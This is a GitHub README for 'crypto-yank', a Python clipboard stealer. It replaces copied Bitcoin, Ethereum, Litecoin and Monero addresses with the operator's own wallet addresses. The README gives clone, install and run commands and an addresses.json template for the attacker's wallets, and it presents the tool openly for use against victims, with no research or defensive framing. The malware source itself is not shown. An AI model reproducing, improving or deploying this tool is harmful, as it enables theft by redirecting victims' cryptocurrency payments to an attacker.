<h1 align='center'>crypto-yank 🏦📋</h1>
<h3 align='center'>A python written crypto currency clipboard stealer.</h3>

### Features:

* Written in Python 3
* Support For: Bitcoin (Legacy & Segwit),Etherum,Litecoin and Monero.
* Easy setup script & simple install.

### About:

**crypto-yank** is a clipboard stealer that monitors the clipboard for crypto addresses and replaces it with your own. If no address is found in the clipboard crypto-yank does nothing and remains waiting for a valid address to replace.

### Usage:

```shell
git clone https://github.com/jacques-andre/crypto-yank
cd crypto-yank
pip3 install -r requirements.txt 
python3 setup.py 
python3 crypto-yank.py
```
##### Optional args for `crypto-yank.py`:

```
--verbose 
```

If you don't want to use the setup script you can provide your own `addresses.json` in the following format.

Example `addresses.json`:

```json
{
    "legacy_btc": "your_legacy_address",
    "segwit_btc": "your_segwit_address",
    "xmr": "your_xmr_address",
    "eth": "your_eth_address",
    "lite": "your_litecoin_address"
}
```
Once this file is created in the same directory as `crypto-yank.py` you can run `crypto-yank.py` to start monitoring.



### Demo:

<img src='https://i.imgur.com/FeT7yAo.png' align='center'></img>
### [Video](https://vimeo.com/437961025)


### Requirements:

[requirements.txt](https://github.com/jacques-andre/crypto-yank/blob/master/requirements.txt)

```
pyperclip==1.8.0
```

### Todo:
- Add more cryptos!
